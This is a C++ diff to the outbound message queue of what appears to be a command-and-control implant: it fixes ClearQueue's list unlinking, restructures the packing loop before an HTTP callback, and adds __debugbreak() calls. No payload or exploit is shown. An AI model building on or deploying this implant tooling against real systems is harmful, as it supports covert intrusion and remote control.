@@ -29,6 +29,7 @@ namespace Message {
     VOID AddMessage(PSTREAM Outbound) {
         HEXANE
 
+        __debugbreak();
         PSTREAM Head = Ctx->Transport.OutboundQueue;
 
         if (!Ctx->Transport.OutboundQueue) {
@@ -46,18 +47,36 @@ namespace Message {
     VOID ClearQueue() {
         HEXANE
 
+        __debugbreak();
         PSTREAM Head = Ctx->Transport.OutboundQueue;
         PSTREAM Swap = { };
+        PSTREAM Prev = { };
+
+        if (!Head) {
+            Ctx->Transport.OutboundQueue = nullptr;
+            return_defer(ERROR_SUCCESS);
+        }
 
         while (Head) {
-
-            Swap = Head->Next;
             if (Head->Ready) {
-                DestroyStream(Head);
-            }
+                if (Prev) {
+                    Prev->Next = Head->Next;
 
-            Head = Swap;
+                } else {
+                    Ctx->Transport.OutboundQueue = Head->Next;
+                }
+
+                Swap = Head;
+                Head = Head->Next;
+                DestroyStream(Swap);
+
+            } else {
+                Prev = Head;
+                Head = Head->Next;
+            }
         }
+
+        defer:
     }
 
     VOID OutboundQueue(PSTREAM Outbound) {
@@ -129,28 +148,26 @@ namespace Message {
 #else
             return_defer(ERROR_SUCCESS);
 #endif
-        } else {
-
-            Head = Ctx->Transport.OutboundQueue;
-            while (Head) {
-                if ((Head->Length + Outbound->Length) > MESSAGE_MAX) {
-                    break;
-                }
-
-                if (Head->Buffer) {
-                    PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
-
-                    Outbound->Length += Head->Length;
-                    Head->Ready = TRUE;
-                }
-                else {
-                    return_defer(ERROR_NO_DATA);
-                }
-
-                Head = Head->Next;
-            }
         }
 
+        Head = Ctx->Transport.OutboundQueue;
+        while (Head) {
+            if ((Head->Length + Outbound->Length) > MESSAGE_MAX) {
+                break;
+            }
+
+            if (Head->Buffer) {
+                PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
+
+                Outbound->Length += Head->Length;
+                Head->Ready = TRUE;
+            }
+            else {
+                return_defer(ERROR_NO_DATA);
+            }
+
+            Head = Head->Next;
+        }
 
 #ifdef TRANSPORT_HTTP
         HttpCallback(Outbound, &Inbound);
